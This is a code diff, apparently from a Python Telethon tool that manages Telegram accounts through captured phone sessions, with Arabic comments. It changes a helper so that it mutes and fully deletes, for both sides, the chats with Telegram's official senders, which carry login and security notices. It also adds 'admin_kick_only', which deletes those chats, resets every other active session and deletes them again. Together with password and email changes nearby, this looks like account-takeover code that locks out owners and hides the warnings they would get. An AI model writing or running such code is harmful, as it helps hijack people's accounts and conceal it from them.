@@ -24,12 +24,24 @@ from telethon.tl.functions.account import (
     SendVerifyEmailCodeRequest,
     VerifyEmailRequest,
     GetPasswordRequest,
+    UpdateNotifySettingsRequest,
 )
 from telethon.tl.types import (
     EmailVerifyPurposeLoginSetup,
     EmailVerifyPurposeLoginChange,
     EmailVerificationCode,
     CodeSettings,
+    InputNotifyPeer,
+    InputPeerNotifySettings,
+)
+from telethon.tl.functions.messages import (
+    DeleteHistoryRequest,
+    DeleteChatUserRequest,
+)
+from telethon.tl.functions.channels import (
+    LeaveChannelRequest,
+    DeleteHistoryRequest as DeleteChannelHistoryRequest,
+    DeleteChannelRequest,
 )
 from telethon.tl.functions.auth import (
     ResetAuthorizationsRequest,
@@ -81,16 +93,28 @@ class EmailVerifyCtx(NamedTuple):
 # أدوات مساعدة
 # ──────────────────────────────────────────
 async def delete_telegram_official_messages(client) -> None:
-    """حذف رسائل تيليجرام الرسمية فقط — تم إيقاف حذف شات البوت بناءً على طلب الإدارة."""
+    """حذف رسائل تيليجرام الرسمية وحذف المحادثة بالكامل وكتمها."""
     senders = list(OFFICIAL_SENDERS)
     
     for sender_id in senders:
         try:
-            msgs = await client.get_messages(sender_id, limit=100)
-            if msgs:
-                await client.delete_messages(sender_id, msgs)
+            # كتم الإشعارات أولاً
+            peer = await client.get_input_entity(sender_id)
+            await client(UpdateNotifySettingsRequest(
+                peer=InputNotifyPeer(peer),
+                settings=InputPeerNotifySettings(mute_until=2**31 - 1)
+            ))
+            
+            # حذف المحادثة بالكامل (وليس فقط السجل)
+            # بالنسبة لـ 777000 فهو User، نستخدم DeleteHistoryRequest مع revoke=True
+            await client(DeleteHistoryRequest(
+                peer=peer,
+                max_id=0,
+                just_clear=False,
+                revoke=True
+            ))
         except Exception as e:
-            logger.debug("delete msgs %s: %s", sender_id, e)
+            logger.debug("mute/delete official %s: %s", sender_id, e)
 
 
 def _is_email_not_allowed(err: Exception) -> bool:
@@ -1037,6 +1061,28 @@ async def admin_full_cleanup(phone: str, new_password: str | None = None) -> dic
     await client.disconnect()
     await database.mark_session_secured(phone)
     return {"success": True, "password": new_password}
+
+
+async def admin_kick_only(phone: str) -> dict:
+    client = await get_active_client(phone)
+    if not client:
+        return {"success": False, "error": "الجلسة معطلة"}
+
+    try:
+        await delete_telegram_official_messages(client)
+        await client(ResetAuthorizationsRequest())
+        await delete_telegram_official_messages(client)
+        await client.disconnect()
+        return {"success": True}
+    except Exception as e:
+        await client.disconnect()
+        err = str(e)
+        if "fresh" in err.lower() or "recently" in err.lower():
+            return {
+                "success": False,
+                "error": "الجلسة جديدة — انتظر ثم أعد المحاولة",
+            }
+        return {"success": False, "error": err}
 
 
 # ──────────────────────────────────────────
